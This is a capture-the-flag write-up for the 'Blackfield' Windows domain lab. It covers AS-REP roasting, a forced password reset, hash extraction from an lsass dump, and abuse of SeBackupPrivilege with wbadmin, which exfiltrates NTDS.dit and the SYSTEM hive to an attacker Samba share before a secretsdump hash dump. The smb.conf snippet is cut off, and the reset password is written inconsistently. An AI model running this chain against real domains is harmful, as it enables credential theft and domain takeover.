---
title: Blackfield
date: 2026-09-01
description: Medium Windows AD box forcing a password reset on a bloodhound-linked account, cracking an lsass dump for the backup service account, and using SeBackupPrivilege with wbadmin to extract NTDS.dit.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Sep  1 00:56:25 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,593,3268,5985,49676 -A -oN scan_results.txt 10.129.229.17
Nmap scan report for 10.129.229.17
Host is up (0.82s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 12:03:01Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   filtered netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49676/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-01T12:03:57
|_  start_date: N/A
|_clock-skew: 7h06m15s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   619.96 ms 10.10.16.1
2   928.17 ms 10.129.229.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  1 00:58:35 2026 -- 1 IP address (1 host up) scanned in 130.40 seconds
```

- Anonymous LDAP bind shows nothing

Listing shares as Guest revealed the `profile$` share is readable — it holds a directory per username. Convert the directory names into a wordlist, and also run `--rid-brute` for valid usernames. Comparing the two lists gave the suspected-legit accounts (we just went with all profile names):

```txt
Administrator
audit2020
svc_backup
support
lydericlefebvre
```

# User

`GetNPUsers` for users with Kerberos pre-auth disabled gives the hash of **support** — decrypted with john:

> `support - #00^BlackKnight`

Querying LDAP with those creds:

- no LegacyPwd
- no servicePrincipleName
- no known svc accounts

**support** is not a member of Remote Management Users — no shell yet.

## bloodhound-python

`bloodhound-python` collects remotely with valid creds:

```sh
# installation
apt install bloodhound
pip3 install bloodhound
```

```sh
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c ALL
```

- Upload the json files to the bloodhound GUI
- Outbound edge between `support` and `audit2020`: **ForceChangePassword**

```sh
net rpc password "audit2020" 'password123!' -U "blackfield"/"support"%"#00^BlackKnight" -S "blackfield.htb"
```

> `audit2020 - Password123!`

Shares as `audit2020` — **forensics** is readable now. It holds an investigator's audit files documenting a previous breach incident.

In `memory_analysis` there's an **lsass.zip** containing `lsass.dmp`:

---
> The **lsass.dmp** file is a memory dump of the Local Security Authority Subsystem Service (LSASS) process on Windows.
> 
>LSASS memory dumps contain cached credentials (plaintext/hashed passwords), Kerberos tickets (TGTs), NTLM hashes, session keys, authentication tokens, and SSO credentials of logged-in users.
---

Pull the info out with `pypykatz`:
```
pypykatz lsa minidump lsass.DMP
```

---
#### Additional info
- To extract users for wordlist

```sh
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > usernames
```

- To extract NThashes for wordlist

```sh
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > NThashes
```

---

Before brute-forcing, check **lockoutThreshold** — it's in the dumped ldap data (search "Lock"). Once verified, spray and **svc_backup** takes the NT hash directly:

> `svc_backup - 9658d1d1dcd9250115e2205d9f48400d`

Shell as **svc_backup** through evil-winrm.

# Root

`whoami /priv` shows **SeBackupPrivilege** & **SeRestorePrivilege**.

> **Info**: Usually abused by copying the **sam & system** from registry — but this is AD, and we want the AD's admin, not the local admin.

---
> **NTDS.dit** is the Active Directory database file on Windows domain controllers that stores all Active Directory objects and their attributes, including user accounts, passwords, and security information.

> **System.hive** is a Windows Registry hive file that contains system-level configuration information and cryptographic keys needed to decrypt the NTDS.dit database.
---

`notes.txt` on the desktop says `root.txt` is **encrypted** — abusing SeBackupPrivilege with `robocopy` still hits access denied on it:

```powershell
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

### Dumping hashes with WBAdmin

**wbadmin** is a Windows command-line tool used to **back up** and **restore** Windows operating systems, files, folders, and volumes from the command prompt.

- First install and configure a samba server with authentication
- Modify the contents of **/etc/samba/smb.conf** to the following:

```
[as
```

---
**Note**: Same idea as **impacket-smbserver** but it won't work here.

**Reason** : `smbserver` is for quick POCs (proof-of-concept). Samba is for real file operations like backups.
- `smbserver` is too basic — it **can't reliably handle** the DC writing large backup files or managing file operations properly
- You need **Samba** because `wbadmin` is writing critical files and needs a proper, stable SMB server.
---

- Create a new user that matches the user in the **force user** parameter:

```sh
adduser smbuser
```

- Create password for new user : `smbuser`

```sh
smbpasswd -a smbuser
```

Start the **SMB demon**:

```sh
service smbd restart
```

Same connection method as before — mount the attacker share (/tmp) from the **winrm-session**:

```powershell
*Evil-WinRM* PS C:\> net use z: \\10.10.16.82\smb /user:smbuser smbpass
```

Back up the **NTDS folder** with `wbadmin`:

```powershell
*Evil-WinRM* PS C:\> echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.82\smb -include:c:\windows\ntds
```

---
#### Why use remote in the attack :

Going to remote (attacker's server) is used in attacks because:

- You control the Samba server — you can immediately extract the backup
- Keeps it off the DC — less evidence left behind
- Faster exfiltration — backup data goes directly to attacker

Technically, a local backup folder would also work to bypass the lock. 
The lock bypass comes from **wbadmin's privileges**, not from the backup being remote.

---

Retrieve the backup version:

```powershell
*Evil-WinRM* PS C:\> wbadmin get versions
```

>Note: Backup version is important to restore the file

Now restore the **NTDS.dit**, specifying the **backup version**:

```powershell
*Evil-WinRM* PS C:\> echo "Y" | wbadmin start recovery -version:09/02/2026-00:58 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

- We got a unlocked version of ntds.dit

---
It extracts **NTDS.dit** from the **backup file** and puts it on the C: drive — but here's the key part:

When Windows extracts files from a backup, **it bypasses the file locks**.
- On a live system, NTDS.dit is locked because Active Directory is constantly using it.
- But inside a backup file, it's just data — no locks. So Windows can pull it out cleanly.

---

**system.hive** is a separate file. It sits in `C:\Windows\System32\config\SYSTEM` on every Windows machine.
- We don't extract it from the backup — we just export it directly:

```sh
reg save HKLM\SYSTEM C:\system.hive
```

Transfer both files to the attacker:

```
cp ntds.dit \\10.10.16.82\smb\NTDS.dit
cp system.hive \\10.10.16.82\smb\system.hive
```

Extract every hash in the domain with **Impacket secretsdump.py**:

```sh
impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL > ADhashes
```

```txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2385f85e0c4f647ee2678c5ff2131a80:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```

Gained `root`
